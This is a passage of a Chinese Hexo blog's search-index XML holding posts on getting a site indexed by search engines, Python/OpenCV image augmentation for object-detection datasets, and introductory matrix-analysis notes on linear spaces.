<li>知乎</li>
<li>CSDN</li>
<li>豆瓣</li>
<li>贴吧等平台<br>发帖，贴出自己的网址，搜索引擎就会进行索引。</li>
</ul>
<ol>
<li>2020/12/4<br>目前本网站未被任何引擎索引。<center>
<img src="https://www.codekp.cn/download/img/csdn/百度为索引.PNG" width = "400" height = "302" alt="图片名称" align=center />
</center>


</li>
</ol>
<h2 id="比较麻烦的检索方式"><a href="#比较麻烦的检索方式" class="headerlink" title="比较麻烦的检索方式"></a>比较麻烦的检索方式</h2><p>  将检索文件放在网站根目录下。<br>  <a href="https://www.codekp.cn/baidu_verify_code-De28227qRL.html">测试连接</a></p>
<p><center>
<img src="https://www.codekp.cn/download/img/csdn/检索.PNG" width = "400" height = "302" alt="图片名称" align=center />
</center><br><pre class="line-numbers language-none"><code class="language-none">hexo clean
hexo g
hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>将备案号填入即可很快被检索。</p>
<h2 id="提高搜索引擎权重"><a href="#提高搜索引擎权重" class="headerlink" title="提高搜索引擎权重"></a>提高搜索引擎权重</h2><ul>
<li>最简单的方法就是在各种平台多放点网址进去。</li>
</ul>
<h2 id="结尾-2020-12-12"><a href="#结尾-2020-12-12" class="headerlink" title="结尾 2020/12/12"></a>结尾 2020/12/12</h2><p>目前网站被百度收录。<br><img src="https://img-blog.csdnimg.cn/20201212234708921.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>谷歌</category>
        <category>百度</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>搜索引擎</tag>
      </tags>
  </entry>
  <entry>
    <title>目标识别数据集扩充_旋转扩充</title>
    <url>/2021/07/28/%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E6%95%B0%E6%8D%AE%E9%9B%86%E6%89%A9%E5%85%852/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="目标识别数据集扩充-旋转扩充"><a href="#目标识别数据集扩充-旋转扩充" class="headerlink" title="目标识别数据集扩充_旋转扩充"></a>目标识别数据集扩充_旋转扩充</h1><h2 id="扩充方法"><a href="#扩充方法" class="headerlink" title="扩充方法"></a>扩充方法</h2><h3 id="原图"><a href="#原图" class="headerlink" title="原图"></a>原图</h3><p><img src="https://www.codekp.cn/download/img/数据集扩充/Original.jpg" alt=""></p>
<h2 id="标签格式转化"><a href="#标签格式转化" class="headerlink" title="标签格式转化"></a>标签格式转化</h2><h3 id="标签xml转txt格式"><a href="#标签xml转txt格式" class="headerlink" title="标签xml转txt格式"></a>标签xml转txt格式</h3><pre class="line-numbers language-none"><code class="language-none">def xml_to_txt(self,dw,dh,xmin,ymin ,xmax ,ymax):
    x &#x3D; (xmin+ xmax) &#x2F; 2.0
    y &#x3D; (ymax + ymin) &#x2F; 2.0
    w &#x3D; xmax- xmin
    h &#x3D; ymax - ymin
    x &#x3D; x &#x2F;dw
    w &#x3D; w &#x2F; dw
    y &#x3D; y &#x2F; dh
    h &#x3D; h &#x2F; dh
    return (x, y, w, h)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="txt转xml格式"><a href="#txt转xml格式" class="headerlink" title="txt转xml格式"></a>txt转xml格式</h3><p>其实就是个数学计算而已<br><pre class="line-numbers language-none"><code class="language-none">def txt_to_xml(self,Pwidth,Pheight,x,y , wp, hp):
    xmin &#x3D; int((x * Pwidth + 1) - wp * 0.5 * Pwidth)
    ymin &#x3D; int((y * Pheight + 1) - hp * 0.5 * Pheight)
    xmax &#x3D; int((x* Pwidth + 1) + wp * 0.5 * Pwidth)
    ymax &#x3D; int((y * Pheight + 1) + hp * 0.5 * Pheight)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="txt文件"><a href="#txt文件" class="headerlink" title="txt文件"></a>txt文件</h2><h3 id="txt文件的读写"><a href="#txt文件的读写" class="headerlink" title="txt文件的读写"></a>txt文件的读写</h3><pre class="line-numbers language-none"><code class="language-none">def saveFlipLabel(txtpath,txt_save_path):
    with open(txt_save_path, &quot;w&quot;) as outfile:
        with open(txtpath, &quot;r&quot;) as infile:
            for line in infile.readlines():
                words &#x3D; line.split(&quot; &quot;)
                horizontal_coord &#x3D; float(words[1])
                outfile.write(
                    words[0] + &quot; &quot; + str(format(1 - horizontal_coord, &quot;.6f&quot;)) + &quot; &quot; + words[2] + &quot; &quot; + words[3] + &quot; &quot; +
                    words[4])
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="txt文件的拷贝"><a href="#txt文件的拷贝" class="headerlink" title="txt文件的拷贝"></a>txt文件的拷贝</h3><pre class="line-numbers language-none"><code class="language-none">def copyLabel(txtpath,txt_save_path):
    shutil.copyfile(txtpath, txt_save_path)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><pre class="line-numbers language-none"><code class="language-none">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    img_aug &#x3D; ImgAugemention()
    imgs_path &#x3D; &#39;.&#x2F;img&#x2F;&#39;
    txt_path &#x3D; &#39;.&#x2F;label&#x2F;&#39;
    img_save_path &#x3D; &#39;.&#x2F;images&#x2F;&#39;
    txt_save_path &#x3D; &#39;.&#x2F;labels&#x2F;&#39;
    angle_list &#x3D; [0,30,60, 90, 120, 150, 180, 270,330]
    img_aug.process_img2(imgs_path, txt_path, img_save_path, txt_save_path)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>主要作用是实现对数据的扩展，对整个文件夹内所有文件进行读取，一键扩展</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python

import cv2
import math
import numpy as np
import os
import pdb
import xml.etree.ElementTree as ET
from Image_expansion import *

class ImgAugemention():
    def __init__(self):
        self.angle &#x3D; 90
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>主要由ImgAugemention类和Image_expansion构成</p>
<h2 id="数据扩展结果"><a href="#数据扩展结果" class="headerlink" title="数据扩展结果"></a>数据扩展结果</h2><p><img src="https://www.codekp.cn/download/img/旋转扩充数据集/0-270.png" alt=""></p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>如果需源码请联系本人，以上传至git私人仓库。</p>
<ul>
<li><a href="https://github.com/mmrslwan1110/Image-expansion2">https://github.com/mmrslwan1110/Image-expansion2</a></li>
</ul>
]]></content>
      <categories>
        <category>目标检测</category>
      </categories>
      <tags>
        <tag>目标检测数据集扩充2</tag>
      </tags>
  </entry>
  <entry>
    <title>目标识别数据集扩充</title>
    <url>/2021/07/26/%E7%9B%AE%E6%A0%87%E8%AF%86%E5%88%AB%E6%95%B0%E6%8D%AE%E9%9B%86%E6%89%A9%E5%85%85%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="目标检测数据集扩充"><a href="#目标检测数据集扩充" class="headerlink" title="目标检测数据集扩充"></a>目标检测数据集扩充</h1><p>数据扩充对于深度神经网络训练通常具有良好的作用，例如2003年Patrice Simard等人所著的一篇论文中他们把MNIST手写数字数据集通过旋转，转换和扭曲进行扩展。通过在这个扩展后的数据集上的训练，他们把MNIST手写数字识别的准确率提升到了98.9%。然后还在“弹性扭曲”的数据集上进行了实验，这是一种特殊的为了模仿手部肌肉的随机抖动的图像扭曲方法。通过使用弹性扭曲扩展的数据，他们最终达到了99.3%的分类准确率。</p>
<p>如果人为扩充的数据集对准确度有提高，则扩展是良性的，说明我们对数据所做的拓展操作是良性的，能够“反映真实世界的变化”，就会被用到整个数据集的扩展。如果扩充数据集对准确度有降低，则说明不能用该操作进行拓展。</p>
<h2 id="扩充方法"><a href="#扩充方法" class="headerlink" title="扩充方法"></a>扩充方法</h2><h3 id="原图"><a href="#原图" class="headerlink" title="原图"></a>原图</h3><p><img src="https://www.codekp.cn/download/img/数据集扩充/Original.jpg" alt=""></p>
<h2 id="图像强度变换"><a href="#图像强度变换" class="headerlink" title="图像强度变换"></a>图像强度变换</h2><h3 id="亮度变化"><a href="#亮度变化" class="headerlink" title="亮度变化"></a>亮度变化</h3><ul>
<li><p>调亮<br><img src="https://www.codekp.cn/download/img/数据集扩充/bright.jpg" alt=""></p>
<pre class="line-numbers language-none"><code class="language-none">def brightness(img):
    img &#x3D; Image.fromarray(img)

    brightness &#x3D; 1 + np.random.randint(1, 9) &#x2F; 10
    brightness_img &#x3D; img.point(lambda p: p * brightness)

    return Image.fromarray(np.uint8(brightness_img))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>调暗<br><img src="https://www.codekp.cn/download/img/数据集扩充/dark.jpg" alt=""></p>
</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">def darkness(img):
    darkness &#x3D; np.random.randint(1, 9) &#x2F; 10
    darkness_img &#x3D; img * darkness
    return Image.fromarray(np.uint8(darkness_img))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="对比度变化"><a href="#对比度变化" class="headerlink" title="对比度变化"></a>对比度变化</h3><p>扩展图像灰度级动态范围，对两极的像素进行压缩，对中间范围的像素进行扩展</p>
<pre class="line-numbers language-none"><code class="language-none">
def contrast(img):
    img &#x3D; Image.fromarray(img)
    range_contrast&#x3D;(-50, 50)

    contrast &#x3D; np.random.randint(*range_contrast)

    contrast_img &#x3D; img.point(lambda p: p * (contrast &#x2F; 127 + 1) - contrast)

    return Image.fromarray(np.uint8(contrast_img))
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>不影响label的位置</p>
</blockquote>
<p><img src="https://www.codekp.cn/download/img/数据集扩充/contrast.jpg" alt=""></p>
<h2 id="图像滤波"><a href="#图像滤波" class="headerlink" title="图像滤波"></a>图像滤波</h2><h3 id="锐化"><a href="#锐化" class="headerlink" title="锐化"></a>锐化</h3><pre class="line-numbers language-none"><code class="language-none">def sharpen(img):
    img &#x3D; cv2.cvtColor(np.asarray(img),cv2.COLOR_RGB2BGR)

    identity &#x3D; np.array([[0, 0, 0],
                        [0, 1, 0],
                        [0, 0, 0]])
    sharpen &#x3D; np.array([[ 0, -1,  0],
                        [-1,  4, -1],
                        [ 0, -1,  0]]) &#x2F; 4
    max_center &#x3D; 4

    sharp &#x3D; sharpen * np.random.random() * max_center
    kernel &#x3D; identity + sharp

    sharpen_img &#x3D; cv2.filter2D(img, -1, kernel)
    return Image.fromarray(cv2.cvtColor(sharpen_img,cv2.COLOR_BGR2RGB))
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>不影响label的位置<br><img src="https://www.codekp.cn/download/img/数据集扩充/sharpen.jpg" alt=""></p>
</blockquote>
<h3 id="高斯模糊"><a href="#高斯模糊" class="headerlink" title="高斯模糊"></a>高斯模糊</h3><pre class="line-numbers language-none"><code class="language-none">def blur(img):
    img &#x3D; cv2.cvtColor(np.asarray(img),cv2.COLOR_RGB2BGR)

    kernel_size &#x3D; (7, 7)
    blur_img &#x3D; cv2.GaussianBlur(img,kernel_size,0)

    return Image.fromarray(cv2.cvtColor(blur_img,cv2.COLOR_BGR2RGB))

def saveBlurLabel(name):
    shutil.copyfile(name + &quot;.txt&quot;, name + &quot;_blur.txt&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>不影响label的位置<br><img src="https://www.codekp.cn/download/img/数据集扩充/blur.jpg" alt=""></p>
</blockquote>
<h2 id="镜像翻转"><a href="#镜像翻转" class="headerlink" title="镜像翻转"></a>镜像翻转</h2><h3 id="图像左右翻转"><a href="#图像左右翻转" class="headerlink" title="图像左右翻转"></a>图像左右翻转</h3><pre class="line-numbers language-none"><code class="language-none">def flip(img):
    flip_img &#x3D; cv2.flip(cv2.cvtColor(np.asarray(img), cv2.COLOR_RGB2BGR), 1)

    return Image.fromarray(cv2.cvtColor(flip_img, cv2.COLOR_BGR2RGB))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>第一个位置的参数 pos = 1 - pos，其他信息不变，可以采用脚本自动生成<br><pre class="line-numbers language-none"><code class="language-none">def saveFlipLabel(name):
    with open(name + &quot;_flip.txt&quot;, &quot;w&quot;) as outfile:
        with open(name + &quot;.txt&quot;, &quot;r&quot;) as infile:
            for line in infile.readlines():
                words &#x3D; line.split(&quot; &quot;)
                horizontal_coord &#x3D; float(words[1])
                outfile.write(
                    words[0] + &quot; &quot; + str(format(1 - horizontal_coord, &quot;.6f&quot;)) + &quot; &quot; + words[2] + &quot; &quot; + words[3] + &quot; &quot; +
                    words[4])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
</blockquote>
<p><img src="https://www.codekp.cn/download/img/数据集扩充/flip.jpg" alt=""></p>
<h3 id="图片裁剪"><a href="#图片裁剪" class="headerlink" title="图片裁剪"></a>图片裁剪</h3><p>裁剪原图80%大小的中心图像，并进行随机移动<br><pre class="line-numbers language-none"><code class="language-none">def crop(img):
    size &#x3D; img.shape[:2]
    kernel_size &#x3D; list(map(lambda x: int(x*0.8), size))
    shift_min, shift_max &#x3D; -50, 50
    shift_size &#x3D; [np.random.randint(shift_min, shift_max), np.random.randint(shift_min, shift_max)]

    crop_img &#x3D; img[
        (size[0]-kernel_size[0])&#x2F;&#x2F;2+shift_size[0]:(size[0]-kernel_size[0])&#x2F;&#x2F;2+kernel_size[0]+shift_size[0],
        (size[1]-kernel_size[1])&#x2F;&#x2F;2+shift_size[1]:(size[1]-kernel_size[1])&#x2F;&#x2F;2+kernel_size[1]+shift_size[1]
    ]

    return Image.fromarray(np.uint8(crop_img))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<blockquote>
<p>可能将目标对象裁减掉，因此采用手工重新标注</p>
</blockquote>
<p><img src="https://www.codekp.cn/download/img/数据集扩充/crop.jpg" alt=""></p>
<h2 id="图形拉伸"><a href="#图形拉伸" class="headerlink" title="图形拉伸"></a>图形拉伸</h2><h3 id="拉伸为正方形"><a href="#拉伸为正方形" class="headerlink" title="拉伸为正方形"></a>拉伸为正方形</h3><pre class="line-numbers language-none"><code class="language-none">def deform(img):
    img &#x3D; Image.fromarray(img)
    w, h &#x3D; img.size[:2]

    # 拉伸成宽为w的正方形
    deform_img &#x3D; img.resize((int(w), int(w)))

    return deform_img
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>原图中比例信息改变，最好重新手工标注</p>
</blockquote>
<p><img src="https://www.codekp.cn/download/img/数据集扩充/deform.jpg" alt=""></p>
<h3 id="镜头畸变"><a href="#镜头畸变" class="headerlink" title="镜头畸变"></a>镜头畸变</h3><p>对图像进行透视变化，模拟鱼眼镜头的镜头畸变</p>
<p>通过播放径向系数k1，k2，k3和切向系数p1，p2实现</p>
<pre class="line-numbers language-none"><code class="language-none">
def distortion(img):
    d_coef&#x3D; np.array((0.15, 0.15, 0.1, 0.1, 0.05))

    # get the height and the width of the image
    h, w &#x3D; img.shape[:2]

    # compute its diagonal
    f &#x3D; (h ** 2 + w ** 2) ** 0.5

    # set the image projective to carrtesian dimension
    K &#x3D; np.array([[f, 0, w &#x2F; 2],
                  [0, f, h &#x2F; 2],
                  [0, 0,   1  ]])

    d_coef &#x3D; d_coef * np.random.random(5) # value
    d_coef &#x3D; d_coef * (2 * (np.random.random(5) &lt; 0.5) - 1) # sign

    # Generate new camera matrix from parameters
    M, _ &#x3D; cv2.getOptimalNewCameraMatrix(K, d_coef, (w, h), 0)

    # Generate look-up tables for remapping the camera image
    remap &#x3D; cv2.initUndistortRectifyMap(K, d_coef, None, M, (w, h), 5)

    # Remap the original image to a new image
    distortion_img &#x3D; cv2.remap(img, *remap, cv2.INTER_LINEAR)

    return Image.fromarray(np.uint8(distortion_img))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>最好重新手工标注<br><img src="https://www.codekp.cn/download/img/数据集扩充/distortion.jpg" alt=""></p>
</blockquote>
<h2 id="加入噪声"><a href="#加入噪声" class="headerlink" title="加入噪声"></a>加入噪声</h2><h3 id="椒盐噪声"><a href="#椒盐噪声" class="headerlink" title="椒盐噪声"></a>椒盐噪声</h3><pre class="line-numbers language-none"><code class="language-none">def addNoise(img):
    rows,cols,dims &#x3D; img.shape
    noise_img &#x3D; img
    for i in range(5000):
        x &#x3D; np.random.randint(0,rows)
        y &#x3D; np.random.randint(0,cols)
        noise_img[x,y,:] &#x3D; 255
    noise_img.flags.writeable &#x3D; True  # 将数组改为读写模式

    return Image.fromarray(np.uint8(noise_img))

def saveNoiseLabel(name):
    shutil.copyfile(name + &quot;.txt&quot;, name + &quot;_noise.txt&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>标记不变</p>
</blockquote>
<p><img src="https://www.codekp.cn/download/img/数据集扩充/addNoise.jpg" alt=""></p>
<h3 id="渐晕"><a href="#渐晕" class="headerlink" title="渐晕"></a>渐晕</h3><pre class="line-numbers language-none"><code class="language-none">
def vignetting(img):
    ratio_min_dist&#x3D;0.2
    range_vignette&#x3D;np.array((0.2, 0.8))
    random_sign&#x3D;False

    h, w &#x3D; img.shape[:2]
    min_dist &#x3D; np.array([h, w]) &#x2F; 2 * np.random.random() * ratio_min_dist

    # create matrix of distance from the center on the two axis
    x, y &#x3D; np.meshgrid(np.linspace(-w&#x2F;2, w&#x2F;2, w), np.linspace(-h&#x2F;2, h&#x2F;2, h))
    x, y &#x3D; np.abs(x), np.abs(y)

    # create the vignette mask on the two axis
    x &#x3D; (x - min_dist[0]) &#x2F; (np.max(x) - min_dist[0])
    x &#x3D; np.clip(x, 0, 1)
    y &#x3D; (y - min_dist[1]) &#x2F; (np.max(y) - min_dist[1])
    y &#x3D; np.clip(y, 0, 1)

    # then get a random intensity of the vignette
    vignette &#x3D; (x + y) &#x2F; 2 * np.random.uniform(*range_vignette)
    vignette &#x3D; np.tile(vignette[..., None], [1, 1, 3])

    sign &#x3D; 2 * (np.random.random() &lt; 0.5) * (random_sign) - 1
    vignetting_img &#x3D; img * (1 + sign * vignette)

    return Image.fromarray(np.uint8(vignetting_img))

def saveVignettingLabel(name):
    shutil.copyfile(name + &quot;.txt&quot;, name + &quot;_vignetting.txt&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对图像添加一个圆范围内的噪声模拟光晕</p>
<blockquote>
<p>标签不变<br><img src="https://www.codekp.cn/download/img/数据集扩充/vignetting.jpg" alt=""></p>
</blockquote>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="随机丢包"><a href="#随机丢包" class="headerlink" title="随机丢包"></a>随机丢包</h3><pre class="line-numbers language-none"><code class="language-none">
def cutout(img):
    min_size_ratio, max_size_ratio &#x3D; 0.1, 0.3
    channel_wise &#x3D; False
    max_crop &#x3D; 4
    replacement&#x3D;0

    size &#x3D; np.array(img.shape[:2])
    mini, maxi &#x3D; min_size_ratio * size, max_size_ratio * size
    cutout_img &#x3D; img
    for _ in range(max_crop):
        # random size
        h &#x3D; np.random.randint(mini[0], maxi[0])
        w &#x3D; np.random.randint(mini[1], maxi[1])
        # random place
        shift_h &#x3D; np.random.randint(0, size[0] - h)
        shift_w &#x3D; np.random.randint(0, size[1] - w)

        if channel_wise:
            c &#x3D; np.random.randint(0, img.shape[-1])
            cutout_img[shift_h:shift_h+h, shift_w:shift_w+w, c] &#x3D; replacement
        else:
            cutout_img[shift_h:shift_h+h, shift_w:shift_w+w] &#x3D; replacement

    return Image.fromarray(np.uint8(cutout_img))

def saveCutoutLabel(name):
    shutil.copyfile(name + &quot;.txt&quot;, name + &quot;_cutout.txt&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>不影响label的位置</p>
</blockquote>
<p><img src="https://www.codekp.cn/download/img/数据集扩充/cutout.jpg" alt=""></p>
<p>参考：</p>
<ul>
<li><a href="https://blog.csdn.net/double_ZZZ/article/details/115691995">目标识别数据集扩充方法</a></li>
</ul>
<p>代码<br>详见：<a href="https://github.com/mmrslwan1110/Image-expansion-IRDSE-">github.com</a></p>
]]></content>
      <categories>
        <category>目标检测</category>
      </categories>
      <tags>
        <tag>目标检测数据集扩充</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵分析引论</title>
    <url>/2020/11/17/%E7%9F%A9%E9%98%B5%E8%AE%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="矩阵分析引论"><a href="#矩阵分析引论" class="headerlink" title="矩阵分析引论"></a><center>矩阵分析引论</center></h1><h2 id="Introduction-to-matrix-analysis"><a href="#Introduction-to-matrix-analysis" class="headerlink" title=" Introduction to matrix analysis "></a><center> Introduction to matrix analysis </center></h2><center>
<div style="position:relative; padding-bottom:75%; width:100%; height:0">
    <iframe src="//player.bilibili.com/player.html?aid=11355346&bvid=BV19x411878L&cid=18777309&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"> </iframe>
</div>

</center>

<span id="more"></span>
<h2 id="1-线性空间与线性变换"><a href="#1-线性空间与线性变换" class="headerlink" title="1.线性空间与线性变换"></a>1.线性空间与线性变换</h2><ol>
<li>对加减乘除封闭的集合被称之为数域。矩阵论中较常用的数域是QRC。其中Q:有理数域、R:实数数域、C复数数域。<br>$Q\subset R\subset C$<br>如果一个非空集合在某数域上，以下八条<center>
<img src="https://www.codekp.cn/download/img/矩阵论/1.PNG" width = "1147" height = "950" alt="图片名称" align=center />
</center>


</li>
</ol>
<h3 id="线性空间例3-（函数空间-f-I-R"><a href="#线性空间例3-（函数空间-f-I-R" class="headerlink" title="线性空间例3.（函数空间$f(I,R)$)"></a>线性空间例3.（函数空间$f(I,R)$)</h3><ul>
<li>$V:$<br>$F(I，R^n)$<br>$I=(0,1) ,[\frac{1}{2}，5]$函数的定义域<br>$R^n值域空间$<br>以函数为元素的抽象集合，数域取R</li>
</ul>
<ul>
<li>： f+g<br>$ +  ： \begin{cases} f_1(x)\ f_2(x)\ f_n(x) \end{cases} + \begin{cases} g_1(x)\ g_2(x)\ g_n(x) \end{cases} = \begin{cases} f_1(x)+g_1(x)\f_2(x)+ g_2(x)\f_n(x)+g_n(x) \end{cases}  x \in I$</li>
</ul>
<ul>
<li>：f<em>k<br>$</em> : \begin{cases} f_1(x)\ f_2(x)\ f_n(x) \end{cases} * k =\begin{cases} kf_1(x)\ kf_2(x)\ kf_n(x) \end{cases}$</li>
</ul>
<p>定义：（向量组及向量组拼成向量抽象矩阵）<br>设V是F上的线性空间V中的有限序列$\alpha_1、\alpha2、\alpha3 …\alpha_p $的一个向量组，向量组按顺序排列的行称为向量组拼成的抽象矩阵$[\alpha_1、\alpha2、\alpha3 …\alpha_p ]$<br>序列：抽象或实际数构成的序列，抽象矩阵。用V中的抽象物拼接为一个矩阵。即：抽象的集合。</p>
<blockquote>
<p>数乘运算、线性空间满足八条运算规则:</p>
</blockquote>
<p>4条：<br>加法有交换律、结合律、有负元、有零元。<br>4条：<br>乘法有两个分配律，数乘法对抽象加法的分配律，数乘法对数值的分配律，先乘后乘以集合和两次分别乘以集合相等，f中的乘法单位元e做数乘法时空间不变。</p>
<p>标准线性空间：<br>例子<br>二维空间<br>三维空间 ：所有有向线段构成的集合。<br>几何空间：<br>函数空间：函数作为运算对象，所构成的空间。信号的集合构成函数空间。</p>
<p>将几何空间的解析几何方法抽象到一般的框架下，集合的量变成代数的量，坐标系。<br>考虑什么样的向量组可以模拟成几何的线性空间的问题。<br>向量组：$\alpha_1、\alpha2、\alpha3 …\alpha_p $<br>抽象矩阵：$[\alpha_1、\alpha2、\alpha3 …\alpha_p ]$<br>1行p列的抽象矩阵，可以竖着拼。<br>行向量，横拼接。<br>列向量，竖拼接。<br>向量组的线性相关性：如果存在不全为零的P个数$k_i\in F, i=1,2,…,p$使得<br>$\alpha_1k_1+\alpha2k_2+\alpha3k_3 …\alpha_pk_p=0$<br>则向量组\alpha_1、\alpha2、\alpha3 …\alpha_p称之为线性相关。<br>注： $\exists\begin{cases} k_1\ k_2\ k_n \end{cases} \neq 0，\begin{cases} k_1\ k_2\ k_n \end{cases}\in F^p$</p>
<p>使得(*)成立，对以上命题进行否定。<br>$\exists a\in P_a $<br>否定$\forall a\notin P_a $</p>
<p> $\forall \begin{cases} k_1\ k_2\ k_n \end{cases} \neq 0$<br> $\alpha_1k_1+\alpha2k_2+\alpha3k_3 …\alpha_pk_p\neq 0$<br>线性无关</p>
<p>线性无关即为线性相关的否定，存在系数不全为零的时，使得等号成立，即线性无关。</p>
<p>$[\alpha_1、\alpha2、\alpha3 …\alpha_p ][x_1,x_2,x_3,…,x_p]^T=0$<br>线性相关《——》有非零解<br>线性无关《——》没有非零解</p>
<p>线性相关性：目的为了将抽象的序列搬移到几何空间中。</p>
<h2 id="基"><a href="#基" class="headerlink" title="基"></a>基</h2><p>定义：（两个线性向量组之间的线性表示）<br>$\alpha_1、\alpha_2、\alpha_3 …\alpha_p;\beta_1、\beta_2、\beta_3、…、\beta_p$</p>
<ol>
<li>称为$\beta$可以由$\alpha_1、\alpha_2、\alpha_3 …\alpha_p$线性表示，如果存在$ k_1、k_2、k_3 …k_p \subset F$使得<br>$\beta=\alpha_1k_1+\alpha_2k_2+\alpha_3k_3 …+\alpha_pk_p$</li>
<li>称$\beta_1、\beta_2、\beta_3、…、\beta_p$可以由$\alpha_1、\alpha_2、\alpha_3 …\alpha_p$线性表示，如果每个$\beta_i$据可由$\alpha_1、\alpha_2、\alpha_3 …\alpha_p$线性表示</li>
</ol>
<h4 id="矩阵表达"><a href="#矩阵表达" class="headerlink" title="矩阵表达"></a>矩阵表达</h4><p>$[\alpha_1、\alpha_2、\alpha_3 …\alpha_p ][x_1,x_2,x_3,…,x_p]^T=\beta$ 其中$A=[\alpha_1、\alpha2、\alpha3 …\alpha_p ]$</p>
<ol>
<li><p>因此$\beta$可由$\alpha_1、\alpha_2、\alpha_3 …\alpha_p$线性表示《=====》非齐次线性方程组有解</p>
</li>
<li><p>重点：</p>
</li>
</ol>
<p>$[\alpha<em>1、\alpha_2、\alpha_3 …\alpha_p] \begin{pmatrix}<br>        x</em>{11} &amp; \cdots &amp; \cdots &amp; \cdots &amp; x<em>{1q} \<br>        x</em>{21} &amp; \cdots &amp;\cdots &amp; \cdots &amp; x<em>{2q} \<br>        \vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \<br>        x</em>{p1} &amp; \cdots &amp; \cdots &amp; \cdots &amp; x<em>{pq}\<br>        \end{pmatrix}</em>{pq} =[\beta_1、\beta_2、\beta_3、…、\beta_p]$</p>
<p>$[\alpha_1、\alpha_2、\alpha_3 …\alpha_p ]$记作A<br>$[\beta_1、\beta_2、\beta_3…\beta_p]$记作B：<br>$AX=B$抽象的矩阵方程</p>
<p>$[\beta_i]$可有$[\alpha_i]$线性表示《=====》线性方程有解。</p>
<ol>
<li>线性表示具有传递性：<br>$[\alpha_1、\alpha2、\alpha3 …\alpha_p ]    、[{\alpha_i}]$<br>$[\beta_1、\beta_2、\beta_3…\beta_q]   、[{\beta_j}]$<br>$[\gamma_1、\gamma_2、\gamma_3…\gamma_t]      、[{\gamma_k}]$   </li>
</ol>
